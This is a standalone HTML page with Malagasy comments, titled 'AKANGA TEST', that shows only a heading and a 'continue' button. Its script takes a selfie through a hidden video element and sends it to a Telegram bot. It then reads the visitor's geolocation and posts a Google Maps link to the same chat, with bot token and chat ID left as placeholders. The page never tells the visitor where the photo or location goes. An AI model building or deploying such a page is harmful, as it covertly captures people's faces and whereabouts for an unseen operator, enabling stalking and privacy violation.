<!DOCTYPE html>
<html lang="mg">
<head>
  <meta charset="UTF-8"/>
  <title>AKANGA TEST</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
</head>
<body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#222;color:#fff">
  <h1>AKANGA TEST</h1>
  <button onclick="startProcess()">Hanohy</button>

  <!-- video miseho kely fotsiny (azo atao hidden ihany koa) -->
  <video id="video" autoplay playsinline style="display:none;"></video>

<script>
  const BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE";
  const CHAT_ID   = "PUT_YOUR_CHAT_ID_HERE";

  async function startProcess() {
    try {
      // Maka camera
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video  = document.getElementById('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      const ctx    = canvas.getContext('2d');

      // Maka selfie iray (test aloha)
      await new Promise(r => setTimeout(r, 2000));
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const imgData = canvas.toDataURL('image/png');
      await sendPhoto(imgData, "üì∏ Selfie test");

      stream.getTracks().forEach(t => t.stop());

      // Maka position
      navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude: lat, longitude: lon } = pos.coords;
        const loc = `üìç Toerana: https://www.google.com/maps?q=${lat},${lon}`;
        sendMessage(loc); // tsy mila await satria tsy async
      });

    } catch (err) {
      alert("‚ùå Erreur: " + err.message);
      console.error(err);
    }
  }

  async function sendPhoto(imgBase64, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);

    const blob = dataURItoBlob(imgBase64);
    form.append("photo", blob, "selfie.png");

    const res = await fetch(url, { method: "POST", body: form });
    console.log("sendPhoto status:", res.status);
  }

  async function sendMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("text", text);

    const res = await fetch(url, { method: "POST", body: form });
    console.log("sendMessage status:", res.status);
  }

  function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab   = new ArrayBuffer(byteString.length);
    const ia   = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
    return new Blob([ab], { type: mime });
  }
</script>
</body>
</html>
